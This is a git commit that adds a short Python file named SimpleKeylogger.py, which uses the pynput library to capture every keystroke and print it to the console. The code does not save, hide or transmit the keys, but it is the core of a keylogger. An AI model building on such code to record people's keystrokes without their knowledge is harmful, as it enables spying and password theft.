e3668a14d288672b6d4d2909aee70339421bd6b2
Isaac Quinones <65132157+PyHacker-YT@users.noreply.github.com>
2020-05-11 13:24:55 -0400

    Created SimpleKeyLogger.py
    yes!

---
+++ SimpleKeylogger.py
@@ -0,0 +1,8 @@
+#YOU NEED TO PIP INSTALL 'pynput'
+from pynput.keyboard import Key, Listener
+
+def on_press(key):
+    print(key)
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
